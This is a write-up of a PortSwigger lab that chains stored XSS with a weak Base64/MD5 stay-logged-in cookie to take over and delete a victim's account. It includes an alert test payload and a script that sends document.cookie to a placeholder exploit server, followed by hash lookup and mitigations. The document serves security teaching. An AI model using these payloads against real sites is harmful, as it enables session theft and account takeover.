# PortSwigger - Offline Password Cracking

## 📌 Lab Description

This lab demonstrates how a weak **stay-logged-in cookie**, combined with a **stored XSS vulnerability**, can allow an attacker to steal a victim's authentication cookie and recover their password offline.

The lab uses a cookie containing:

    Base64(username + ":" + MD5(password))

The goal is to:

1. Exploit the stored XSS vulnerability.
2. Steal Carlos's `stay-logged-in` cookie.
3. Decode the Base64 value.
4. Extract the MD5 password hash.
5. Recover Carlos's password.
6. Log in as Carlos.
7. Delete Carlos's account.

---

## 🎯 Lab Objective

**Goal:** Access Carlos's account and delete it.

### Provided Credentials

    Username: wiener
    Password: peter
    Victim: carlos

---

## 🔎 Step 1 — Analyze the Stay-Logged-In Cookie

After logging in as `wiener`, the application provides a `stay-logged-in` cookie.

Example:

    d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

The cookie appears to be Base64 encoded.

Decoding it gives:

    wiener:51dc30ddc473d43a6011e9ebba6ca770

The first part is the username:

    wiener

The second part appears to be an MD5 hash:

    51dc30ddc473d43a6011e9ebba6ca770

The password for `wiener` is:

    peter

MD5 hashing `peter` produces:

    51dc30ddc473d43a6011e9ebba6ca770

Therefore, the cookie structure is:

    Base64(username:MD5(password))

---

## 🧪 Step 2 — Confirm the Stored XSS Vulnerability

The comments functionality is vulnerable to stored XSS.

A simple test payload was used:

    <img src=x onerror="alert(1)">

After submitting the comment, the JavaScript executed when the comment was rendered.

This confirmed that stored XSS could be used to execute JavaScript in another user's browser.

---

## 🖥️ Step 3 — Prepare the Exploit Server

An exploit server was used to receive data from the victim's browser.

The exploit server provides a unique URL similar to:

    https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

The payload was designed to redirect the victim's browser to the exploit server while appending their cookies.

---

## 💥 Step 4 — Steal Carlos's Cookie Using Stored XSS

The following payload was used:

    <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

The payload was submitted through the vulnerable comment functionality.

When Carlos viewed the malicious comment, his browser executed the JavaScript.

The browser then requested the exploit server URL containing his cookies.

---

## 🍪 Step 5 — Obtain Carlos's Stay-Logged-In Cookie

The exploit server access log captured Carlos's cookie.

The stolen cookie was:

    carlos:26323c16d5f4dabff3bb136f2460a943

The value was obtained by decoding the Base64-encoded cookie.

The structure was:

    username:MD5(password)

Therefore:

    Username:
    carlos

    Password Hash:
    26323c16d5f4dabff3bb136f2460a943

---

## 🔓 Step 6 — Recover Carlos's Password

The MD5 hash was searched online:

    26323c16d5f4dabff3bb136f2460a943

The corresponding password was identified as:

    onceuponatime

Therefore, Carlos's credentials were:

    Username: carlos
    Password: onceuponatime

---

## 👤 Step 7 — Log In as Carlos

Using the recovered credentials:

    Username: carlos
    Password: onceuponatime

I was able to authenticate as Carlos.

---

## 🗑️ Step 8 — Delete Carlos's Account

After logging in as Carlos, the account deletion functionality was accessed.

Carlos's account was successfully deleted, completing the lab.

---

## 🔗 Attack Chain

    Stored XSS
         ↓
    Execute JavaScript in Carlos's Browser
         ↓
    Steal document.cookie
         ↓
    Capture Stay-Logged-In Cookie
         ↓
    Base64 Decode
         ↓
    Extract MD5 Password Hash
         ↓
    Recover Password
         ↓
    Login as Carlos
         ↓
    Delete Account

---

## 🧠 Key Concepts Learned

### 1. Weak Authentication Cookies

Authentication cookies should not contain easily reversible or crackable representations of passwords.

In this lab:

    Base64(username:MD5(password))

Base64 is only an encoding mechanism and does not provide security.

---

### 2. Weak Password Hashing

MD5 is cryptographically broken and should not be used for password storage.

Password storage should use modern password hashing algorithms such as:

- Argon2
- bcrypt
- scrypt
- PBKDF2

---

### 3. Stored XSS

Stored XSS occurs when malicious JavaScript is permanently stored by an application and executed when another user views the affected content.

In this lab, stored XSS allowed JavaScript to execute in Carlos's browser.

---

### 4. Cookie Theft

JavaScript can access cookies through:

    document.cookie

when those cookies are not protected with the appropriate cookie attributes.

Important protections include:

- `HttpOnly`
- `Secure`
- `SameSite`

An `HttpOnly` cookie cannot be accessed through `document.cookie`.

---

### 5. Base64 Is Not Encryption

Base64 encoding does not protect sensitive information.

For example:

    Base64 Encoded Data
            ↓
          Decode
            ↓
       Original Data

Anyone who obtains the Base64 value can decode it.

---

## 🛡️ Mitigation

The vulnerability chain could be mitigated by:

- Preventing stored XSS through proper output encoding and input handling.
- Using a strong Content Security Policy (CSP).
- Marking sensitive authentication cookies as `HttpOnly`.
- Using the `Secure` cookie attribute.
- Using appropriate `SameSite` settings.
- Never storing password hashes directly in authentication cookies.
- Avoiding MD5 for password storage.
- Using modern password hashing algorithms such as Argon2 or bcrypt.
- Using secure, random, server-side session identifiers instead of predictable authentication data.

---

## 🧰 Tools Used

- Burp Suite
- PortSwigger Web Security Academy
- Browser Developer Tools
- Exploit Server
- Base64 decoding
- MD5 hash identification

---

## 📚 References

- PortSwigger Authentication:
  https://portswigger.net/web-security/authentication

- PortSwigger Cross-Site Scripting:
  https://portswigger.net/web-security/cross-site-scripting

- PortSwigger Offline Password Cracking Lab:
  https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

---

## ✅ Lab Status

**Lab:** Offline Password Cracking

**Status:** 🟢 Solved

**Folder:** `10-offline-password-cracking`
